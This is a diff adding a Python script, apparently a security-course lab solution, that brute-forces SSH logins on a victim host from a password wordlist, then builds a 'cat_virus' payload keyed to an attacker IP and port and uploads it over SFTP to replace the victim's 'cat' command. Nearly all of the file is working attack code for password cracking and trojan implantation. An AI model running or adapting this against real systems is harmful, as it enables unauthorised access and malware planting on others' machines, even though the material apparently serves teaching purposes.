@@ -1,0 +1,61 @@
+#!/usr/bin/env python3
+import paramiko
+from itertools import product
+import subprocess
+import sys
+
+username = 'csc2022'
+port = 22
+data = []
+
+# ./crack_attack <Victim IP> <Attacker IP> <Attacker port>
+
+# Task I
+with open('/home/csc2022/materials/victim.dat','r') as f:
+    data = list(filter(None,f.read().split('\n')))
+    # data.append('csc2022')
+print(data)
+def conn(client,passwd):
+    try:
+        client.connect(sys.argv[1],port,username,passwd)
+        return True
+    except paramiko.ssh_exception.AuthenticationException as e:
+        print('>>>>>>',e,passwd)
+        return False
+    except paramiko.ssh_exception.SSHException as e:
+        print(e,passwd)
+        return conn(client,passwd)
+    except Exception as e:
+        print('-----------',e)
+        return False
+right_password = ""
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+for i in range(1,6):
+    for pw in product(data,repeat=i):
+        print('trying connect with password:',''.join(pw))
+        if conn(client,''.join(pw)):
+            right_password = ''.join(pw)
+            break
+    else:
+        continue
+    break
+print("right password found!")
+
+# Task II & III
+
+# compress cat
+subprocess.run(f'./compress_virus.sh {sys.argv[2]} {sys.argv[3]}',shell=True)
+# establish sftp
+tran = client.get_transport()
+sftp = paramiko.SFTPClient.from_transport(tran)
+
+try:
+    sftp.chdir('/home/csc2022/')
+    sftp.put('./cat_virus','/home/csc2022/cat')
+    sftp.chmod('/home/csc2022/cat',0o755)
+except Exception as e:
+    print(e)
+finally:
+    sftp.close()
+
